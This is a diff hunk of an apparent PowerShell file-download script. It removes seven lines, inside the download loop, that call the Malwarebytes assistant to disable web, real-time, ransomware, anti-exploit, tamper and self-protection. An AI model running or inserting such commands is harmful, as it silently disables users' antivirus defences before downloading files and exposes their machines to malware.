@@ -145,13 +145,6 @@ $outputFolder = "C:\Downloads"
 foreach ($url in $urls) {
     $fileName = [System.IO.Path]::GetFileName($url)
     $outputPath = Join-Path -Path $outputFolder -ChildPath $fileName
-    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablewebprotection", "."
-    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablertp", "."
-    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablerw", "."
-    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disableae", "."
-    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disabletamperprotection", "."
-    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disableautodbcls", "."
-    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablesp", "."
 
     Write-Host "Downloading file from $url..."
     
